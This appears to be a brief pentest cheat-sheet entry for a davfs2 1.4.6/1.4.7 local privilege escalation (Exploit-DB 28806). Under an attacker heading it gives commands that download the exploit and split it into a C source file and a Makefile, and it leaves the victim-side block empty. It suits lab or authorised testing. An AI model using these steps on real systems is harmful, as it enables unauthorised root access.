### davfs2 1.4.6/1.4.7 - Local Privilege Escalation
https://www.exploit-db.com/exploits/28806

attacker@kali
```
wget --no-check-certificate https://www.exploit-db.com/download/28806 -O 28806.temp.txt
tr -d '\r' < 28806.temp.txt > 28806.txt && sed -n '40,73p' 28806.txt > coda.c && sed -n '84,90p' 28806.txt > Makefile && rm 28806.temp.txt
```

victim@linux
```


```
